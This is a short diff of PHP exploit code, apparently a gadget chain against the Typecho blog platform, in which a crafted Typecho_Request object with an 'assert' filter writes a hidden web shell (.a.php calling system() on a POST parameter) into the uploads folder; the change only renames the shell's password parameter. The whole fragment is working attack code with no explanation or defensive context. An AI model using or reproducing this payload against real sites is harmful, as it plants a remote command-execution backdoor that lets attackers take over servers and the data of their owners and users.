@@ -20,7 +20,7 @@ $this->_items[] = $item;
 }
 class Typecho_Request
 {
-private $_params = array('screenName'=>'fputs(fopen(\'./usr/uploads/.a.php\',\'w\'),\'<?php @system($_POST[_e831bb45]);?>\')');
+private $_params = array('screenName'=>'fputs(fopen(\'./usr/uploads/.a.php\',\'w\'),\'<?php @system($_POST[_3d24d8de]);?>\')');
 private $_filter = array('assert');
 //private $_filter = array('assert', array('Typecho_Response', 'redirect'));
 }
